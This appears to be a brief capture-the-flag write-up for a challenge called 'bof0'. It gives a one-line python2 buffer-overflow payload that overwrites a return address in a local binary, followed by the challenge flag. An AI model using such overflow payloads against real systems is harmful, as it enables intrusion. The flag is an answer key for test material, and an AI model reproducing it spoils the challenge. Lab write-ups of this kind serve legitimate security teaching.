# bof0

# Writeup

- Payload:  
```bash
python2 -c "import struct;print (76*'A'+struct.pack('I',0x08049230))" | ./chall
```   

Note: Use python2

# Flag

`shellmates{B0f_cAN_oVerWriT3_Ret_4dr_th4T$_n0T_4Ll_Th0uGH}`

``